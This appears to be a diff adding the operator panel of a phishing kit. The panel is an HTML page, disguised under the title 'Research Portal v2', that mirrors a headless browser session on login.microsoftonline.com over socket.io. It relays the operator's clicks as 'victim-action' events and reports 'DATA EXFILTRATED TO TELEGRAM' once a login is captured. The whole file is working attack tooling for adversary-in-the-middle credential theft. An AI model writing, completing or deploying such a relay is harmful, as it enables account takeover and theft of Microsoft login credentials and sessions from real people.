@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Research Portal v2</title>
+    <style>
+        body { background: #0a0a0a; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; margin: 0; padding: 20px; }
+        #container { position: relative; border: 1px solid #333; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
+        #screen-mirror { width: 1280px; height: 720px; background: #000; display: block; cursor: crosshair; }
+        .status-bar { width: 1280px; background: #1a1a1a; padding: 10px; border-bottom: 1px solid #333; font-size: 14px; color: #888; }
+        #status-msg { color: #00ff00; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="status-bar">
+        STATUS: <span id="status-msg">INITIALIZING RELAY...</span> | 
+        TARGET: login.microsoftonline.com
+    </div>
+    <div id="container">
+        <img id="screen-mirror" src="" />
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const img = document.getElementById('screen-mirror');
+        
+        socket.on('browser-render', (data) => {
+            img.src = 'data:image/jpeg;base64,' + data.screenshot;
+            document.getElementById('status-msg').innerText = "LIVE - MIRRORING HEADLESS SESSION";
+        });
+
+        img.addEventListener('click', (e) => {
+            const rect = img.getBoundingClientRect();
+            const x = (e.clientX - rect.left) * (1280 / rect.width);
+            const y = (e.clientY - rect.top) * (720 / rect.height);
+            socket.emit('victim-action', { type: 'click', x, y });
+        });
+
+        socket.on('success', (data) => {
+            document.getElementById('status-msg').style.color = "cyan";
+            document.getElementById('status-msg').innerText = "DATA EXFILTRATED TO TELEGRAM";
+        });
+    </script>
+</body>
+</html>
